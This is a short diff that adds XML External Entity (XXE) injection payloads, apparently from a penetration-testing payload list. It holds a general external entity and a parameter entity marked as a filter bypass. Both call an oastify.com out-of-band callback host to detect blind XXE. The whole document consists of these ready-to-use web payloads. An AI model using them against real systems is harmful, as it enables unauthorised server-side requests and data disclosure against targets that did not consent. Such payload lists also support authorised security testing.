@@ -1,0 +1,10 @@
+<!DOCTYPE meow [<!ENTITY XXE SYSTEM "http://e9o0enzj5podje8gk2r4qi4ouf06oxcm.oastify.com">]>
+
+&XXE;
+
+
+---
+
+
+// Bypass some filter (parameter external entity )
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://e9o0enzj5podje8gk2r4qi4ouf06oxcm.oastify.com"> %xxe; ]>
